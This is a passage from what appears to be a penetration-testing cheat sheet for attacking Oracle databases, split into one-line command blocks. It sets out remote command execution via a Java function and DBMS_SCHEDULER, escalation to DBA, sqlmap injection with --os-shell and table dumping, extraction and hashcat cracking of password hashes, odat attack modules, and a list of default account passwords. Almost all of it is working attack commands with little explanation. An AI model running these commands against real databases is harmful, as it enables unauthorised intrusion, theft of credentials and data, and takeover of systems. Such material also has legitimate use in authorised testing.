<!-- cmd: {"id":"wh7kjssqxmptlbtt4","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### k71coid5amptlbttb
```bash
}
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"k71coid5amptlbttb","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### 4fqjgszewmptlbtti
```bash
/
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"4fqjgszewmptlbtti","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### sz5u9ur6bmptlbttq
```bash
CREATE OR REPLACE FUNCTION rce(cmd VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME 'RCE.exec(java.lang.String) return java.lang.String';
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"sz5u9ur6bmptlbttq","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### k7i7tiolcmptlbttv
```bash
/
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"k7i7tiolcmptlbttv","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### lxrmdefcnmptlbtu0
```bash
SELECT rce('id') FROM dual;
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"lxrmdefcnmptlbtu0","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

## RCE via DBMS_SCHEDULER
<!-- section: {"id":"4peudmpr0mptlbt8z","order":8,"collapsed":false} -->

### 2cm2lauy2mptlbtuq
```bash
-- Execute OS command via scheduler (DBA privilege)
```

_RCE via DBMS_SCHEDULER_

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"2cm2lauy2mptlbtuq","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### px1iivjz4mptlbtux
```bash
BEGIN
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"px1iivjz4mptlbtux","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### 3grvmm0m7mptlbtv2
```bash
  DBMS_SCHEDULER.CREATE_JOB(
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"3grvmm0m7mptlbtv2","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### qfd81mbqymptlbtv7
```bash
    job_name => 'EXEC_CMD',
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"qfd81mbqymptlbtv7","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### yr3nuncnsmptlbtvd
```bash
    job_type => 'EXECUTABLE',
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"yr3nuncnsmptlbtvd","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### 8cbnuwytvmptlbtvi
```bash
    job_action => '/bin/bash',
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"8cbnuwytvmptlbtvi","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### 5xlreoxx1mptlbtvo
```bash
    number_of_arguments => 3,
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"5xlreoxx1mptlbtvo","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### vy0fiklvqmptlbtvv
```bash
    enabled => FALSE
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"vy0fiklvqmptlbtvv","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### ljm3cppk9mptlbtw0
```bash
  );
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"ljm3cppk9mptlbtw0","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### 57gpbg75lmptlbtw5
```bash
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_CMD',1,'-c');
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"57gpbg75lmptlbtw5","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### wi5m26dmdmptlbtwa
```bash
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_CMD',2,'id > /tmp/pwned.txt');
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"wi5m26dmdmptlbtwa","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### 7tchabtfumptlbtwg
```bash
  DBMS_SCHEDULER.ENABLE('EXEC_CMD');
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"7tchabtfumptlbtwg","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### 7gxnci3yxmptlbtwm
```bash
  DBMS_SCHEDULER.RUN_JOB('EXEC_CMD');
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"7gxnci3yxmptlbtwm","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### ad92ig7z4mptlbtws
```bash
END;
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"ad92ig7z4mptlbtws","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

### 9b57o3ptbmptlbtwy
```bash
/
```

**Tags:** oracle, rce, scheduler, exploitation
<!-- cmd: {"id":"9b57o3ptbmptlbtwy","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->

## Privilege Escalation
<!-- section: {"id":"wliyjtm3hmptlbt97","order":9,"collapsed":false} -->

### dk7377kktmptlbtxr
```bash
-- Grant DBA
```

_Privilege Escalation_

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"dk7377kktmptlbtxr","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### ibytkdhftmptlbtxy
```bash
GRANT DBA TO $USER;
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"ibytkdhftmptlbtxy","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### 7je4cootmmptlbty3
```bash
-- Via SQL injection to DBA
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"7je4cootmmptlbty3","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### 2gnev29psmptlbty9
```bash
-- Check for EXECUTE ANY PROCEDURE
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"2gnev29psmptlbty9","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### lvu5ww3czmptlbtyf
```bash
SELECT * FROM session_privs WHERE privilege='EXECUTE ANY PROCEDURE';
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"lvu5ww3czmptlbtyf","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### xsgt7289rmptlbtyk
```bash
-- odat privilege escalation
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"xsgt7289rmptlbtyk","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### wlgngysmsmptlbtys
```bash
python3 odat.py privesc -s $TARGET -d $SID -U $USER -P $PASS
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"wlgngysmsmptlbtys","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### 71sp615wlmptlbtyy
```bash
-- Exploit EXECUTE privilege on package owned by SYS
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"71sp615wlmptlbtyy","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### 86n9cb7j1mptlbtz3
```bash
-- CVE-2006-0552: UTL_FILE privilege escalation
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"86n9cb7j1mptlbtz3","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### 2tyxcxhfwmptlbtz8
```bash
-- Check for vulnerable packages
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"2tyxcxhfwmptlbtz8","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

### 3pefjokk8mptlbtzd
```bash
SELECT object_name, object_type FROM all_objects WHERE owner='SYS' AND object_type='PACKAGE BODY';
```

**Tags:** oracle, privesc, exploitation
<!-- cmd: {"id":"3pefjokk8mptlbtzd","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->

## SQL Injection
<!-- section: {"id":"zfj8hvxmsmptlbt9d","order":10,"collapsed":false} -->

### fb59hbnjvmptlbtzz
```bash
sqlmap -u "$URL?id=1" --dbms=oracle --dbs --batch
```

_SQL Injection_

**Tags:** oracle, sqli, sqlmap
<!-- cmd: {"id":"fb59hbnjvmptlbtzz","language":"bash","sectionId":"zfj8hvxmsmptlbt9d","tags":["oracle","sqli","sqlmap"]} -->

### kqjfv5irvmptlbu05
```bash
sqlmap -u "$URL?id=1" --dbms=oracle --os-shell --batch
```

**Tags:** oracle, sqli, sqlmap
<!-- cmd: {"id":"kqjfv5irvmptlbu05","language":"bash","sectionId":"zfj8hvxmsmptlbt9d","tags":["oracle","sqli","sqlmap"]} -->

### vngsljg42mptlbu0c
```bash
sqlmap -u "$URL?id=1" --dbms=oracle --dump -T $TABLE -D $DATABASE --batch
```

**Tags:** oracle, sqli, sqlmap
<!-- cmd: {"id":"vngsljg42mptlbu0c","language":"bash","sectionId":"zfj8hvxmsmptlbt9d","tags":["oracle","sqli","sqlmap"]} -->

## Hash Extraction & Cracking
<!-- section: {"id":"7bv29joq0mptlbt9j","order":11,"collapsed":false} -->

### et2c59iq8mptlbu0t
```bash
-- Get hashes (DBA required)
```

_Hash Extraction & Cracking_

**Tags:** oracle, hashcracking, hashcat
<!-- cmd: {"id":"et2c59iq8mptlbu0t","language":"bash","sectionId":"7bv29joq0mptlbt9j","tags":["oracle","hashcracking","hashcat"]} -->

### m1na46puzmptlbu0y
```bash
SELECT username, password FROM dba_users;          -- DES (old)
```

**Tags:** oracle, hashcracking, hashcat
<!-- cmd: {"id":"m1na46puzmptlbu0y","language":"bash","sectionId":"7bv29joq0mptlbt9j","tags":["oracle","hashcracking","hashcat"]} -->

### gfz2sroghmptlbu13
```bash
SELECT name, spare4 FROM sys.user$;               -- SHA1 (11g+)
```

**Tags:** oracle, hashcracking, hashcat
<!-- cmd: {"id":"gfz2sroghmptlbu13","language":"bash","sectionId":"7bv29joq0mptlbt9j","tags":["oracle","hashcracking","hashcat"]} -->

### vj15pjnj5mptlbu19
```bash
-- Hashcat DES
```

**Tags:** oracle, hashcracking, hashcat
<!-- cmd: {"id":"vj15pjnj5mptlbu19","language":"bash","sectionId":"7bv29joq0mptlbt9j","tags":["oracle","hashcracking","hashcat"]} -->

### 7e14c6q9ymptlbu1f
```bash
hashcat -m 3100 "hash:username" /usr/share/wordlists/rockyou.txt
```

**Tags:** oracle, hashcracking, hashcat
<!-- cmd: {"id":"7e14c6q9ymptlbu1f","language":"bash","sectionId":"7bv29joq0mptlbt9j","tags":["oracle","hashcracking","hashcat"]} -->

### cisr2sp63mptlbu1l
```bash
-- Hashcat SHA1 (mode 112)
```

**Tags:** oracle, hashcracking, hashcat
<!-- cmd: {"id":"cisr2sp63mptlbu1l","language":"bash","sectionId":"7bv29joq0mptlbt9j","tags":["oracle","hashcracking","hashcat"]} -->

### ik2b1xs5kmptlbu1r
```bash
hashcat -m 112 "hash:username" /usr/share/wordlists/rockyou.txt
```

**Tags:** oracle, hashcracking, hashcat
<!-- cmd: {"id":"ik2b1xs5kmptlbu1r","language":"bash","sectionId":"7bv29joq0mptlbt9j","tags":["oracle","hashcracking","hashcat"]} -->

## odat — All-in-One
<!-- section: {"id":"abe3rja5ymptlbt9n","order":12,"collapsed":false} -->

### gvmtntszxmptlbu2t
```bash
python3 odat.py all -s $TARGET -p 1521 -d $SID -U $USER -P $PASS
```

_odat — All-in-One_

**Tags:** oracle, odat, all-in-one
<!-- cmd: {"id":"gvmtntszxmptlbu2t","language":"bash","sectionId":"abe3rja5ymptlbt9n","tags":["oracle","odat","all-in-one"]} -->

### dscryht0lmptlbu30
```bash
python3 odat.py dbmsadvisor -s $TARGET -d $SID -U $USER -P $PASS
```

**Tags:** oracle, odat, all-in-one
<!-- cmd: {"id":"dscryht0lmptlbu30","language":"bash","sectionId":"abe3rja5ymptlbt9n","tags":["oracle","odat","all-in-one"]} -->

### bdy84ffpqmptlbu36
```bash
python3 odat.py dbmsscheduler -s $TARGET -d $SID -U $USER -P $PASS
```

**Tags:** oracle, odat, all-in-one
<!-- cmd: {"id":"bdy84ffpqmptlbu36","language":"bash","sectionId":"abe3rja5ymptlbt9n","tags":["oracle","odat","all-in-one"]} -->

### b9eh37lcumptlbu3b
```bash
python3 odat.py externaltable -s $TARGET -d $SID -U $USER -P $PASS
```

**Tags:** oracle, odat, all-in-one
<!-- cmd: {"id":"b9eh37lcumptlbu3b","language":"bash","sectionId":"abe3rja5ymptlbt9n","tags":["oracle","odat","all-in-one"]} -->

### os1raaku6mptlbu3g
```bash
python3 odat.py dblink -s $TARGET -d $SID -U $USER -P $PASS
```

**Tags:** oracle, odat, all-in-one
<!-- cmd: {"id":"os1raaku6mptlbu3g","language":"bash","sectionId":"abe3rja5ymptlbt9n","tags":["oracle","odat","all-in-one"]} -->

## TNS Listener Poisoning (CVE-2012-1675)
<!-- section: {"id":"o7bqthtccmptlbt9s","order":13,"collapsed":false} -->

### vj92s9rigmptlbu3x
```bash
lsnrctl status $TARGET
```

_TNS Listener Poisoning (CVE-2012-1675)_

**Tags:** oracle, tns, listener, cve
<!-- cmd: {"id":"vj92s9rigmptlbu3x","language":"bash","sectionId":"o7bqthtccmptlbt9s","tags":["oracle","tns","listener","cve"]} -->

### xhl313lfymptlbu42
```bash
lsnrctl services $TARGET
```

**Tags:** oracle, tns, listener, cve
<!-- cmd: {"id":"xhl313lfymptlbu42","language":"bash","sectionId":"o7bqthtccmptlbt9s","tags":["oracle","tns","listener","cve"]} -->

## Default Credentials
<!-- section: {"id":"l47lrj5a2mptlbt9x","order":14,"collapsed":false} -->

### c2g9fr1ummptlbu4g
```bash
sys      : change_on_install
```

_Default Credentials_

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"c2g9fr1ummptlbu4g","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### d5rtpuc9imptlbu4m
```bash
system   : manager
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"d5rtpuc9imptlbu4m","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### z4mgsgqb6mptlbu4s
```bash
system   : oracle
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"z4mgsgqb6mptlbu4s","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### ljl51gtq1mptlbu4x
```bash
system   : password
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"ljl51gtq1mptlbu4x","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### faqoj924amptlbu53
```bash
scott    : tiger
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"faqoj924amptlbu53","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### ezlp2m4onmptlbu58
```bash
dbsnmp   : dbsnmp
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"ezlp2m4onmptlbu58","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### hxhdxxod7mptlbu5e
```bash
sysman   : sysman
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"hxhdxxod7mptlbu5e","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### hqxa5nrfxmptlbu5j
```bash
hr       : hr
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"hqxa5nrfxmptlbu5j","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### wuazur0uzmptlbu5q
```bash
oe       : oe
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"wuazur0uzmptlbu5q","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->

### hyngv8ixxmptlbu5w
```bash
sh       : sh
```

**Tags:** oracle, default-credentials
<!-- cmd: {"id":"hyngv8ixxmptlbu5w","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->
